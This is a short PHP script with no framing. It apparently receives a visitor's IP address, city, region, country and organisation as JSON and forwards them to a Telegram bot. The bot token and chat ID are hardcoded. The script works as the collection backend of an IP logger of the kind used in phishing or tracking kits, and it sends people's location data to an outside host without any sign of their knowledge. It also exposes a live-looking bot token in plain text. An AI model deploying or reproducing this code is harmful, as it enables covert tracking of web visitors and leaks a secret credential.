<?php
$input = json_decode(file_get_contents("php://input"), true);

$message = "IP: " . $input['ip'] . "\n" .
           "City: " . $input['city'] . "\n" .
           "Region: " . $input['region'] . "\n" .
           "Country: " . $input['country'] . "\n" .
           "Org: " . $input['org'];

$token = "7788665747:AAH_HIsff4i7lUqbWbH9fuuSbPkvKQwPVes";
$chat_id = "7788665747";

file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($message));
?>
